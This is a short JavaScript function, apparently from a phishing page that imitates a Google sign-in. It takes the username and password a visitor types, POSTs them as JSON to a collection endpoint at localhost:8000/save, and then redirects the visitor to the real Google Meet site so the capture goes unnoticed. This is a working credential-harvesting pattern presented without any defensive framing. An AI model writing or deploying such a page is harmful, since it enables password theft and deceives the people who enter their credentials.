async function sendDataToServer(){
    console.log("Sent data to the server")
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value
     


    const data  = {
        username:username,
        password:password,
    }

    const res = await fetch("http://localhost:8000/save",{
        method: "POST",
        headers:{
            "Content-Type": "application/json",
        },
        body:JSON.stringify(data)
    })

    
    if(username!="" && password !="") window.location.href = "https://meet.google.com/"
}